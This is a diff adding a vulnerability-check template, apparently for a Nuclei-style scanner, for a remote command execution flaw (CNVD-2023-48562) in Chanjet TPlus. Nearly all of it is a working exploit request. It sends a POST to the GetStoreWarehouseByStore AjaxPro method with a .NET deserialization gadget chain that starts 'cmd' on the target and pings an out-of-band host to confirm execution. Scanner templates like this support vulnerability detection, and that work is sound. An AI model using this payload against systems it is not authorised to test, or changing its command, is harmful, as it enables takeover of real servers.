@@ -1,0 +1,48 @@
+id: CNVD-2023-48562
+brief:
+    title: Chanjet TPlus GetStoreWarehouseByStore - Remote Command Execution
+    by: SleepingBag945
+    level: critical
+    about: Changjet Tplus has a front-end remote code execution vulnerability. An attacker can use the GetStoreWarehouseByStore method to inject a serialized payload and execute arbitrary commands. This ultim...
+    label:
+        - cnvd
+        - cnvd2023
+        - chanjettplus
+        - rce
+        - oast
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore'
+      head:
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+      body: |-
+        {
+          "storeID":{
+            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "ObjectInstance":{
+            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "StartInfo":{
+              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "FileName":"cmd",
+              "Arguments":"/c ping {{interactsh-url}}"
+            }
+            }
+          }
+        }
+      signs:
+        - "on": word
+          has:
+            - actorId或archivesId不能为空
+            - '"Type":"System.ArgumentException"'
+            - Object reference not set to an instance of an object
+            - System.NullReferenceException
+          in: body
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
